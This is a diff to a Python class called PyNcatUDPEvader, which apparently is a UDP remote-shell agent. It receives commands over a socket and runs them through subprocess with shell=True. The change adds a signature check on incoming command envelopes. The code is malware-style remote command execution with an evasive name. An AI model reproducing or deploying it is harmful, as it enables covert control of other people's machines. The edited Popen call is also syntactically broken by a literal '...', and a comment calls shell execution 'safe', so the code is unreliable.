@@ -461,16 +461,34 @@ class PyNcatUDPEvader:
                                 raw_packet, addr = client.recvfrom(65507)
                                 last_activity[0] = time.time()
                                 instruction_bytes = self._unpack_and_verify(raw_packet)
-                                if instruction_bytes in (b"__PONG__", b"__PING__"):
+                                
+                                if instruction_bytes in (b"__PONG__", b"__PING__"): 
                                     continue
-                                cmd = instruction_bytes.decode('utf-8', errors='replace').strip()
-                                if not cmd:
+                                    
+                                # --- VALIDATE ASYMMETRIC SIGNATURE ---
+                                try:
+                                    envelope = json.loads(instruction_bytes.decode('utf-8'))
+                                    cmd_text = envelope["cmd"]
+                                    signature_text = envelope["sig"]
+                                    
+                                    # Perform the structural math verification using the local public key
+                                    if not crypto_engine.verify_command(cmd_text, signature_text):
+                                        logging.warning("[-] Security Alert: Signature validation failed. Dropping unauthorized datagram.")
+                                        continue
+                                except Exception as parse_err:
+                                    logging.warning(f"[-] Dropped malformed instruction frame: {parse_err}")
                                     continue
-                                if cmd.lower() in ['exit', 'quit']:
+                                # -------------------------------------
+                                
+                                # Proceed to evaluate standard terminal exit directives
+                                if cmd_text.lower() in ['exit', 'quit']:
                                     heartbeat_running.clear()
                                     return
+                                    
+                                # Execute the verified command safely via subprocess
                                 try:
-                                    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                                    proc = subprocess.Popen(cmd_text, shell=True, ...)
+
                                     stdout, stderr = proc.communicate(timeout=15)
                                     response = stdout + stderr
                                     if not response:
